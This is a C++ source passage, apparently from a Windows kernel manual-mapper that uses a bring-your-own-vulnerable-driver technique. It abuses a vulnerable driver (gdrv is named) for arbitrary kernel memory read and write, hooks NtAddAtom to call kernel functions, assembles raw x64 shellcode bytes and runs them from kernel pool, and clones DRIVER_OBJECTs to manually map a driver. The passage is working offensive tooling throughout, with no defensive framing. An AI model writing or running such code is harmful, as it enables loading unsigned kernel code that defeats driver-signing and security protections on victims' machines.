        SetError(outError, "KernelAllocateIndependentPages: NtAddAtom hook call failed or allocation returned NULL.");
        AgentDebugLog("D", "kernel_utils.cpp:AllocateIndependentPagesViaNtAddAtom", "alloc_failed", "{}");
        return 0;
    }

    bool FreeIndependentPagesViaNtAddAtom(uint64_t base, uint32_t size, std::string* outError)
    {
        if (!base || !size)
            return true;

        if (!VulnDriverIsLoaded())
        {
            SetError(outError, "KernelFreeIndependentPages: vulnerable driver is not loaded.");
            return false;
        }

        if (!s_exportsPrecached)
        {
            SetError(outError, "KernelFreeIndependentPages: exports not pre-cached.");
            return false;
        }

        const uint64_t freeFn = s_cachedMmFreeIndependentPages;
        if (!freeFn)
        {
            SetError(outError, "KernelFreeIndependentPages: MmFreeIndependentPages not exported on this build.");
            return false;
        }

        return CallKernelFunction<void>(nullptr, freeFn, base, static_cast<uint64_t>(size));
    }

    void AppendBytes(std::vector<uint8_t>& out, const uint8_t* data, size_t len)
    {
        out.insert(out.end(), data, data + len);
    }

    void AppendPreCallStackAlign(std::vector<uint8_t>& out)
    {
        static const uint8_t kCode[] = { 0x48, 0x83, 0xEC, 0x08 }; // sub rsp, 8
        AppendBytes(out, kCode, sizeof(kCode));
    }

    void AppendPostCallStackAlign(std::vector<uint8_t>& out)
    {
        static const uint8_t kCode[] = { 0x48, 0x83, 0xC4, 0x08 }; // add rsp, 8
        AppendBytes(out, kCode, sizeof(kCode));
    }

    void AppendCallRax(std::vector<uint8_t>& out)
    {
        AppendPreCallStackAlign(out);
        static const uint8_t kCode[] = { 0xFF, 0xD0 };
        AppendBytes(out, kCode, sizeof(kCode));
        AppendPostCallStackAlign(out);
    }

    constexpr uint32_t kObjCaseInsensitive = 0x40;
    constexpr size_t kDriverObjectSize = 0x150;
    constexpr size_t kDriverExtensionSize = 0x30;
    constexpr size_t kOffDeviceObject = 0x08;
    constexpr size_t kOffDriverExtension = 0x30;

    void AppendMovRegImm64(std::vector<uint8_t>& out, uint8_t rexB, uint8_t regOpcode, uint64_t value)
    {
        out.push_back(rexB);
        out.push_back(regOpcode);
        for (int i = 0; i < 8; ++i)
            out.push_back(static_cast<uint8_t>((value >> (8 * i)) & 0xFF));
    }

    bool ReadKernelQword(uint64_t address, uint64_t* value)
    {
        return value && VulnReadKernelMemory(address, value, sizeof(*value));
    }

    bool KernelObDereferenceObject(uint64_t object, std::string* outError)
    {
        if (object == 0)
            return true;

        const uint64_t obDeref = GetKernelExport("ntoskrnl.exe", "ObDereferenceObject");
        if (!obDeref)
        {
            SetError(outError, "CloneKernelDriverObject: ObDereferenceObject export not found.");
            return false;
        }

        std::vector<uint8_t> shellcode;
        AppendMovRegImm64(shellcode, 0x48, 0xB9, object);
        AppendMovRegImm64(shellcode, 0x48, 0xB8, obDeref);
        AppendCallRax(shellcode);
        shellcode.push_back(0xC3);

        if (RunKernelShellcode(shellcode.data(), shellcode.size(), nullptr, outError) == 0 && outError && !outError->empty())
            return false;
        return true;
    }

    uint64_t KernelObReferenceDriverObjectByName(const wchar_t* driverObjectName, std::string* outError)
    {
        if (!driverObjectName || !driverObjectName[0])
        {
            SetError(outError, "CloneKernelDriverObject: empty driver object name.");
            return 0;
        }

        const size_t nameChars = wcslen(driverObjectName);
        if (nameChars == 0 || nameChars > 120)
        {
            SetError(outError, "CloneKernelDriverObject: driver object name length invalid.");
            return 0;
        }

        const uint64_t obRef = GetKernelExport("ntoskrnl.exe", "ObReferenceObjectByName");
        const uint64_t ioDriverObjectTypeAddr = GetKernelExport("ntoskrnl.exe", "IoDriverObjectType");
        if (!obRef || !ioDriverObjectTypeAddr)
        {
            SetError(outError, "CloneKernelDriverObject: ObReferenceObjectByName or IoDriverObjectType missing.");
            return 0;
        }

        uint64_t objectType = 0;
        if (!ReadKernelQword(ioDriverObjectTypeAddr, &objectType) || objectType == 0)
        {
            SetError(outError, "CloneKernelDriverObject: failed to read IoDriverObjectType value.");
            return 0;
        }

        constexpr uint32_t kParamsSize = 0x100;
        constexpr uint32_t kUnicodeOff = 0x00;
        constexpr uint32_t kNameOff = 0x20;
        constexpr uint32_t kObjectOutOff = 0x90;

        std::string allocError;
        const uint64_t params = KernelAllocatePool(kParamsSize, 0x624F6244, &allocError); // 'DmOb'
        if (params == 0)
        {
            if (outError && outError->empty())
                outError->swap(allocError);
            return 0;
        }

        const uint16_t nameBytes = static_cast<uint16_t>(nameChars * sizeof(wchar_t));
        std::vector<uint8_t> block(kParamsSize, 0);
        *reinterpret_cast<uint16_t*>(block.data() + kUnicodeOff + 0) = nameBytes;
        *reinterpret_cast<uint16_t*>(block.data() + kUnicodeOff + 2) = static_cast<uint16_t>(nameBytes + sizeof(wchar_t));
        *reinterpret_cast<uint64_t*>(block.data() + kUnicodeOff + 8) = params + kNameOff;
        memcpy(block.data() + kNameOff, driverObjectName, nameBytes + sizeof(wchar_t));

        if (!VulnWriteKernelMemory(params, block.data(), block.size()))
        {
            SetError(outError, "CloneKernelDriverObject: failed to write ObReference params block.");
            return 0;
        }

        const uint64_t unicodeAddr = params + kUnicodeOff;
        const uint64_t objectOutAddr = params + kObjectOutOff;

        std::vector<uint8_t> shellcode;
        shellcode.push_back(0x48);
        shellcode.push_back(0x83);
        shellcode.push_back(0xEC);
        shellcode.push_back(0x40);

        AppendMovRegImm64(shellcode, 0x48, 0xB9, unicodeAddr);
        static const uint8_t kMovEdx[] = { 0xBA, 0x40, 0x00, 0x00, 0x00 };
        static const uint8_t kXorR8[] = { 0x4D, 0x31, 0xC0 };
        static const uint8_t kXorR9[] = { 0x4D, 0x31, 0xC9 };
        AppendBytes(shellcode, kMovEdx, sizeof(kMovEdx));
        AppendBytes(shellcode, kXorR8, sizeof(kXorR8));
        AppendBytes(shellcode, kXorR9, sizeof(kXorR9));
        AppendMovRegImm64(shellcode, 0x48, 0xB8, objectType);

        uint8_t storeType[] = { 0x48, 0x89, 0x44, 0x24, 0x20 };
        AppendBytes(shellcode, storeType, sizeof(storeType));

        uint8_t zeroMode[] = { 0x48, 0xC7, 0x44, 0x24, 0x28, 0x00, 0x00, 0x00, 0x00 };
        AppendBytes(shellcode, zeroMode, sizeof(zeroMode));
        uint8_t zeroCtx[] = { 0x48, 0xC7, 0x44, 0x24, 0x30, 0x00, 0x00, 0x00, 0x00 };
        AppendBytes(shellcode, zeroCtx, sizeof(zeroCtx));

        AppendMovRegImm64(shellcode, 0x48, 0xB8, objectOutAddr);
        uint8_t storeOut[] = { 0x48, 0x89, 0x44, 0x24, 0x38 };
        AppendBytes(shellcode, storeOut, sizeof(storeOut));

        AppendMovRegImm64(shellcode, 0x48, 0xB8, obRef);
        AppendCallRax(shellcode);

        static const uint8_t kAddRsp[] = { 0x48, 0x83, 0xC4, 0x40 };
        AppendBytes(shellcode, kAddRsp, sizeof(kAddRsp));
        shellcode.push_back(0xC3);

        if (RunKernelShellcode(shellcode.data(), shellcode.size(), nullptr, outError) == 0 &&
            outError && !outError->empty())
        {
            return 0;
        }

        uint64_t driverObject = 0;
        if (!ReadKernelQword(objectOutAddr, &driverObject) || driverObject == 0)
        {
            char msg[256];
            sprintf_s(msg, "CloneKernelDriverObject: ObReferenceObjectByName('%ls') returned NULL.",
                      driverObjectName);
            SetError(outError, msg);
            return 0;
        }

        return driverObject;
    }

    uint64_t CloneDriverObjectFromTemplate(uint64_t templateDriverObject, std::string* outError)
    {
        std::vector<uint8_t> templateObject(kDriverObjectSize);
        if (!VulnReadKernelMemory(templateDriverObject, templateObject.data(), templateObject.size()))
        {
            SetError(outError, "CloneKernelDriverObject: failed to read template DRIVER_OBJECT.");
            return 0;
        }

        const uint64_t templateExtension =
            *reinterpret_cast<uint64_t*>(templateObject.data() + kOffDriverExtension);
        if (templateExtension == 0)
        {
            SetError(outError, "CloneKernelDriverObject: template DRIVER_OBJECT has NULL DriverExtension.");
            return 0;
        }

        std::vector<uint8_t> extension(kDriverExtensionSize);
        if (!VulnReadKernelMemory(templateExtension, extension.data(), extension.size()))
        {
            SetError(outError, "CloneKernelDriverObject: failed to read template DRIVER_EXTENSION.");
            return 0;
        }

        std::string allocError;
        const uint64_t cloneExtension =
            KernelAllocatePool(static_cast<uint32_t>(kDriverExtensionSize), 0x4F624478, &allocError); // 'DrvX'
        if (cloneExtension == 0)
        {
            if (outError && outError->empty())
                outError->swap(allocError);
            return 0;
        }

        const uint64_t cloneObject =
            KernelAllocatePool(static_cast<uint32_t>(kDriverObjectSize), 0x4F624472, &allocError); // 'DrvO'
        if (cloneObject == 0)
        {
            if (outError && outError->empty())
                outError->swap(allocError);
            return 0;
        }

        *reinterpret_cast<uint64_t*>(extension.data()) = cloneObject;
        if (!VulnWriteKernelMemory(cloneExtension, extension.data(), extension.size()))
        {
            SetError(outError, "CloneKernelDriverObject: failed to write cloned DRIVER_EXTENSION.");
            return 0;
        }

        *reinterpret_cast<uint64_t*>(templateObject.data() + kOffDeviceObject) = 0;
        *reinterpret_cast<uint64_t*>(templateObject.data() + kOffDriverExtension) = cloneExtension;

        if (!VulnWriteKernelMemory(cloneObject, templateObject.data(), templateObject.size()))
        {
            SetError(outError, "CloneKernelDriverObject: failed to write cloned DRIVER_OBJECT.");
            return 0;
        }

        return cloneObject;
    }

    uint64_t InvokeKernelShellcodeAt(uint64_t poolAddr, uint64_t* outStatus, std::string* outError)
    {
        uint64_t result = 0;
        if (!CallKernelFunction(&result, poolAddr))
        {
            SetError(outError, "RunKernelShellcode: NtAddAtom hook call failed.");
            return 0;
        }
        if (outStatus)
            *outStatus = result;
        return result;
    }

    int32_t KernelCall2ViaNtAddAtom(uint64_t func, uint64_t arg1, uint64_t arg2, std::string* outError)
    {
        uint64_t result = 0;
        if (!CallKernelFunction(&result, func, arg1, arg2))
        {
            SetError(outError, "KernelCall2: NtAddAtom hook call failed.");
            return static_cast<int32_t>(0xC0000001);
        }
        return static_cast<int32_t>(result);
    }
}

uint64_t GetNtoskrnlBase()
{
    return GetKernelModuleBaseByName("ntoskrnl.exe");
}

uint64_t GetKernelExport(const char* moduleName, const char* exportName)
{
    const uint64_t base = GetKernelModuleBaseByName(moduleName);
    if (!base)
        return 0;

    static uint64_t s_cachedBase = 0;
    static std::string s_cachedModule;
    static std::vector<uint8_t> s_cachedImage;

    const auto loadModuleImage = [&]() -> const std::vector<uint8_t>&
    {
        if (s_cachedBase == base && s_cachedModule == moduleName && !s_cachedImage.empty())
            return s_cachedImage;

        s_cachedBase = base;
        s_cachedModule = moduleName ? moduleName : "";
        s_cachedImage.clear();

        std::string path = SystemRootPath() + "\\System32\\" + moduleName;
        s_cachedImage = ReadFileBytes(path.c_str());
        if (s_cachedImage.empty())
        {
            path = SystemRootPath() + "\\System32\\drivers\\" + moduleName;
            s_cachedImage = ReadFileBytes(path.c_str());
        }
        return s_cachedImage;
    };

    const auto& image = loadModuleImage();
    if (image.empty())
        return 0;

    const uint32_t rva = GetExportRvaFromImage(image.data(), exportName);
    return rva ? base + rva : 0;
}

bool PreCacheNtoskrnlExports(std::string* outError)
{
    if (outError)
        outError->clear();

    AgentDebugLogClear();
    printf("[*] Pre-caching ntoskrnl exports (before BYOVD)...\n");
    fflush(stdout);
    AgentDebugLog("H", "kernel_utils.cpp:PreCacheNtoskrnlExports", "precache_start", "{}");

    const uint64_t exPool = GetKernelExport("ntoskrnl.exe", "ExAllocatePoolWithTag");
    printf("[*] Pre-cache ExAllocatePoolWithTag=0x%llX\n", static_cast<unsigned long long>(exPool));
    fflush(stdout);

    const uint64_t exPool2 = GetKernelExport("ntoskrnl.exe", "ExAllocatePool2");
    printf("[*] Pre-cache ExAllocatePool2=0x%llX\n", static_cast<unsigned long long>(exPool2));
    fflush(stdout);

    const uint64_t indPages = GetKernelExport("ntoskrnl.exe", "MmAllocateIndependentPagesEx");
    printf("[*] Pre-cache MmAllocateIndependentPagesEx=0x%llX\n", static_cast<unsigned long long>(indPages));
    fflush(stdout);

    const uint64_t freeIndPages = GetKernelExport("ntoskrnl.exe", "MmFreeIndependentPages");
    printf("[*] Pre-cache MmFreeIndependentPages=0x%llX\n", static_cast<unsigned long long>(freeIndPages));
    fflush(stdout);

    const uint64_t ntAddAtom = GetKernelExport("ntoskrnl.exe", "NtAddAtom");
    printf("[*] Pre-cache NtAddAtom=0x%llX\n", static_cast<unsigned long long>(ntAddAtom));
    fflush(stdout);

    if (!exPool && !exPool2)
    {
        if (outError)
            outError->assign("PreCacheNtoskrnlExports: neither ExAllocatePoolWithTag nor ExAllocatePool2 found.");
        AgentDebugLog("H", "kernel_utils.cpp:PreCacheNtoskrnlExports", "precache_failed", "{}");
        return false;
    }
    if (!ntAddAtom)
    {
        if (outError)
            outError->assign("PreCacheNtoskrnlExports: NtAddAtom export not found.");
        AgentDebugLog("H", "kernel_utils.cpp:PreCacheNtoskrnlExports", "precache_no_ntaddatom", "{}");
        return false;
    }

    {
        std::string path = SystemRootPath() + "\\System32\\ntoskrnl.exe";
        auto ntosImage = ReadFileBytes(path.c_str());
        if (ntosImage.empty())
        {
            path = SystemRootPath() + "\\System32\\drivers\\ntoskrnl.exe";
            ntosImage = ReadFileBytes(path.c_str());
        }
        const uint32_t ntAddAtomRva = ntosImage.empty() ? 0 : GetExportRvaFromImage(ntosImage.data(), "NtAddAtom");
        const uint8_t* stub = (ntAddAtomRva && !ntosImage.empty())
            ? RvaToPtr(ntosImage.data(), ntAddAtomRva)
            : nullptr;
        if (!stub || !IsKernelNtAddAtomHookable(stub))
        {
            printf("[-] Pre-cache NtAddAtom kernel entry not hookable"
                   " (bytes=%02X %02X %02X %02X; type=%s)\n",
                   stub ? stub[0] : 0, stub ? stub[1] : 0,
                   stub ? stub[2] : 0, stub ? stub[3] : 0,
                   stub ? ClassifyKernelNtAddAtomPrologue(stub) : "missing");
            fflush(stdout);
            if (outError)
                outError->assign("PreCacheNtoskrnlExports: NtAddAtom kernel entry not hookable.");
            AgentDebugLog("I", "kernel_utils.cpp:PreCacheNtoskrnlExports", "precache_stub_invalid", "{}");
            return false;
        }
        printf("[+] Pre-cache NtAddAtom kernel prologue=%s (%02X %02X %02X %02X ...)\n",
               ClassifyKernelNtAddAtomPrologue(stub),
               stub[0], stub[1], stub[2], stub[3]);
        fflush(stdout);
        {
            char dataJson[96];
            sprintf_s(dataJson, "{\"prologue\":\"%s\"}", ClassifyKernelNtAddAtomPrologue(stub));
            AgentDebugLog("I", "kernel_utils.cpp:PreCacheNtoskrnlExports", "precache_kernel_prologue", dataJson);
        }
        // Save first 12 bytes from PE image for later restore (avoid gdrv .text read).
        memset(s_cachedNtAddAtomOriginal, 0, sizeof(s_cachedNtAddAtomOriginal));
        memcpy(s_cachedNtAddAtomOriginal, stub, sizeof(s_cachedNtAddAtomOriginal));
        s_cachedNtAddAtomOriginalValid = true;
        AgentDebugLog("E", "kernel_utils.cpp:PreCacheNtoskrnlExports", "precache_original_bytes_saved", "{}");
    }

    {
        HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
        const auto userNtAddAtom = ntdll
            ? reinterpret_cast<const uint8_t*>(GetProcAddress(ntdll, "NtAddAtom"))
            : nullptr;
        if (!userNtAddAtom || !IsUserNtAddAtomSyscallStub(userNtAddAtom))
        {
            printf("[-] Pre-cache ntdll!NtAddAtom syscall stub validation failed"
                   " (bytes=%02X %02X %02X %02X; expected 4C 8B D1 B8)\n",
                   userNtAddAtom ? userNtAddAtom[0] : 0,
                   userNtAddAtom ? userNtAddAtom[1] : 0,
                   userNtAddAtom ? userNtAddAtom[2] : 0,
                   userNtAddAtom ? userNtAddAtom[3] : 0);
            fflush(stdout);
            if (outError)
                outError->assign("PreCacheNtoskrnlExports: ntdll NtAddAtom syscall stub validation failed.");
            AgentDebugLog("I", "kernel_utils.cpp:PreCacheNtoskrnlExports", "precache_ntdll_stub_invalid", "{}");
            return false;
        }
        printf("[+] Pre-cache ntdll!NtAddAtom syscall stub OK (4C 8B D1 B8 ...)\n");
        fflush(stdout);
        AgentDebugLog("I", "kernel_utils.cpp:PreCacheNtoskrnlExports", "precache_ntdll_stub_ok", "{}");
    }

    s_cachedExAllocatePoolWithTag = exPool;
    s_cachedExAllocatePool2 = exPool2;
    s_cachedMmAllocateIndependentPagesEx = indPages;
    s_cachedMmFreeIndependentPages = freeIndPages;
    s_cachedNtAddAtom = ntAddAtom;
    s_exportsPrecached = true;

    printf("[+] Pre-cached ntoskrnl exports OK\n");
    fflush(stdout);
    AgentDebugLog("H", "kernel_utils.cpp:PreCacheNtoskrnlExports", "precache_ok", "{}");
    return true;
}

uint64_t RunKernelShellcode(const uint8_t* shellcode, size_t size, uint64_t* outStatus, std::string* outError)
{
    if (!shellcode || size == 0 || size > 0xE00)
    {
        SetError(outError, "RunKernelShellcode: invalid shellcode parameters.");
        return 0;
    }
    if (!VulnDriverIsLoaded())
    {
        SetError(outError, "RunKernelShellcode: vulnerable driver is not loaded.");
        return 0;
    }

    std::string allocError;
    const uint32_t allocSize = static_cast<uint32_t>(size + 0x100);
    const uint64_t pool = KernelAllocateMemory(allocSize, KernelAllocMode::Pool, 0x4D6F6F4C, &allocError);
    if (pool == 0)
    {
        if (outError && outError->empty())
            outError->swap(allocError);
        return 0;
    }

    if (!VulnWriteKernelMemory(pool, shellcode, size))
    {
        SetError(outError, "RunKernelShellcode: failed to write shellcode into kernel pool.");
        return 0;
    }

    printf("[*] RunKernelShellcode: executing %zu bytes at pool 0x%llX via NtAddAtom\n",
           size, static_cast<unsigned long long>(pool));
    FlushLog();

    return InvokeKernelShellcodeAt(pool, outStatus, outError);
}

uint64_t KernelAllocatePool(uint32_t size, uint32_t tag, std::string* outError)
{
    return AllocateKernelPoolViaNtAddAtom(size, tag, outError);
}

uint64_t KernelAllocateMemory(uint32_t size, KernelAllocMode mode, uint32_t tag, std::string* outError)
{
    if (outError)
        outError->clear();

    if (mode == KernelAllocMode::IndependentPages)
    {
        std::string indError;
        const uint64_t ptr = AllocateIndependentPagesViaNtAddAtom(size, &indError);
        if (ptr != 0)
            return ptr;

        printf("[*] KernelAllocateMemory: IndependentPages failed (%s), falling back to Pool.\n",
               indError.empty() ? "unknown" : indError.c_str());
        FlushLog();
        AgentDebugLog("D", "kernel_utils.cpp:KernelAllocateMemory", "independent_pages_fallback_pool", "{}");
    }

    return AllocateKernelPoolViaNtAddAtom(size, tag, outError);
}

bool KernelFreeMemory(uint64_t base, uint32_t size, KernelAllocMode mode, std::string* outError)
{
    if (outError)
        outError->clear();

    if (mode == KernelAllocMode::IndependentPages && base != 0 && size != 0)
        return FreeIndependentPagesViaNtAddAtom(base, size, outError);

    // Pool allocations are not freed by the mapper; leaks are acceptable for this loader.
    return true;
}

int32_t KernelCall2(uint64_t func, uint64_t arg1, uint64_t arg2, std::string* outError)
{
    return KernelCall2ViaNtAddAtom(func, arg1, arg2, outError);
}

uint64_t CloneKernelDriverObject(const wchar_t* driverObjectName,
                                 const wchar_t* alternateDriverObjectName,
                                 std::string* outError)
{
    if (outError)
        outError->clear();

    if (!VulnDriverIsLoaded())
    {
        if (outError)
            outError->assign("CloneKernelDriverObject: vulnerable driver is not loaded.");
        return 0;
    }

    std::string resolveError;
    uint64_t templateObject = KernelObReferenceDriverObjectByName(driverObjectName, &resolveError);
    if (templateObject == 0 && alternateDriverObjectName && alternateDriverObjectName[0])
        templateObject = KernelObReferenceDriverObjectByName(alternateDriverObjectName, &resolveError);

    if (templateObject == 0)
    {
        if (outError)
        {
            if (!resolveError.empty())
                outError->swap(resolveError);
            else
                outError->assign("CloneKernelDriverObject: failed to resolve template driver object.");
        }
        return 0;
    }

    std::string cloneError;
    const uint64_t cloneObject = CloneDriverObjectFromTemplate(templateObject, &cloneError);
    KernelObDereferenceObject(templateObject, nullptr);

    if (cloneObject == 0)
    {
        if (outError)
        {
            if (!cloneError.empty())
                outError->swap(cloneError);
            else
                outError->assign("CloneKernelDriverObject: clone failed.");
        }
        return 0;
    }

    printf("[+] Cloned DRIVER_OBJECT for manual map: template=0x%llX clone=0x%llX\n",
           static_cast<unsigned long long>(templateObject),
           static_cast<unsigned long long>(cloneObject));
    return cloneObject;
}

bool IsWindows11_24H2OrLater()
{
    using RtlGetVersion_t = LONG(NTAPI*)(PRTL_OSVERSIONINFOW);
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll)
        return false;

    auto fn = reinterpret_cast<RtlGetVersion_t>(GetProcAddress(ntdll, "RtlGetVersion"));
    if (!fn)
        return false;

    RTL_OSVERSIONINFOW info = {};
    info.dwOSVersionInfoSize = sizeof(info);
    if (fn(&info) != 0)
        return false;

    return info.dwMajorVersion >= 10 && info.dwBuildNumber >= 26100;
}
